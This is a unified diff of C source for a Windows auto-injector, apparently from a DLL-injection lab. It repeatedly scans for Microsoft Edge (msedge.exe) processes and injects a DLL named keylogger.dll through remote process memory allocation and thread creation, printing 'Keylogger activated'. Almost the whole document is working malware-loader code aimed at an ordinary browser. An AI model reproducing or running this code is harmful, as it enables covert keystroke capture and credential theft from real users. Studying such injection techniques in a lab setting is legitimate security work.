@@ -4,21 +4,16 @@
 
 #define TARGET_PROCESS "msedge.exe"
 #define DLL_PATH "C:\\Users\\namkg\\Downloads\\dll-injection-lab-main\\dll-injection-lab-main\\week4-injection\\dll\\keylogger.dll"
+#define MAX_PROCESSES 200
 
-// DLL 인젝션 함수
 BOOL InjectDLL(DWORD processId, const char* dllPath) {
-    printf("[+] Injecting into PID: %lu\n", processId);
-    
     HANDLE hProcess = OpenProcess(
         PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | 
         PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ,
         FALSE, processId
     );
     
-    if (!hProcess) {
-        printf("[-] Failed to open process\n");
-        return FALSE;
-    }
+    if (!hProcess) return FALSE;
     
     SIZE_T dllPathLen = strlen(dllPath) + 1;
     LPVOID pDllPath = VirtualAllocEx(hProcess, NULL, dllPathLen, 
@@ -46,7 +41,6 @@ BOOL InjectDLL(DWORD processId, const char* dllPath) {
         CloseHandle(hThread);
         VirtualFreeEx(hProcess, pDllPath, 0, MEM_RELEASE);
         CloseHandle(hProcess);
-        printf("[+] DLL injected successfully!\n");
         return TRUE;
     }
     
@@ -57,13 +51,13 @@ BOOL InjectDLL(DWORD processId, const char* dllPath) {
 
 int main() {
     printf("=================================\n");
-    printf("Auto DLL Injection Monitor\n");
+    printf("Edge Browser Auto Injector\n");
     printf("=================================\n");
     printf("Target: %s\n", TARGET_PROCESS);
     printf("Monitoring... Press Ctrl+C to stop\n\n");
     
-    DWORD lastPIDs[100] = {0};
-    int lastCount = 0;
+    DWORD injectedPIDs[MAX_PROCESSES] = {0};
+    int injectedCount = 0;
     
     while (1) {
         HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
@@ -78,29 +72,30 @@ int main() {
         if (Process32First(hSnapshot, &pe32)) {
             do {
                 if (_stricmp(pe32.szExeFile, TARGET_PROCESS) == 0) {
-                    BOOL isNew = TRUE;
-                    for (int i = 0; i < lastCount; i++) {
-                        if (lastPIDs[i] == pe32.th32ProcessID) {
-                            isNew = FALSE;
+                    // 이미 주입했는지 확인
+                    BOOL alreadyInjected = FALSE;
+                    for (int i = 0; i < injectedCount; i++) {
+                        if (injectedPIDs[i] == pe32.th32ProcessID) {
+                            alreadyInjected = TRUE;
                             break;
                         }
                     }
                     
-                    if (isNew) {
-                        printf("\n[!] NEW TARGET DETECTED!\n");
-                        printf("[*] Process: %s (PID: %lu)\n", 
-                               pe32.szExeFile, pe32.th32ProcessID);
+                    if (!alreadyInjected) {
+                        printf("\n[!] NEW EDGE PROCESS DETECTED!\n");
+                        printf("[*] Process: %s (PID: %lu)\n", pe32.szExeFile, pe32.th32ProcessID);
                         
-                        Sleep(2000);
+                        Sleep(500); // 짧게 대기
                         
                         if (InjectDLL(pe32.th32ProcessID, DLL_PATH)) {
-                            printf("[SUCCESS] Keylogger activated!\n\n");
+                            printf("[+] DLL injected successfully!\n");
+                            printf("[SUCCESS] Keylogger activated!\n");
+                            
+                            if (injectedCount < MAX_PROCESSES) {
+                                injectedPIDs[injectedCount++] = pe32.th32ProcessID;
+                            }
                         } else {
-                            printf("[FAILED] Injection failed!\n\n");
-                        }
-                        
-                        if (lastCount < 100) {
-                            lastPIDs[lastCount++] = pe32.th32ProcessID;
+                            printf("[-] Injection failed\n");
                         }
                     }
                 }
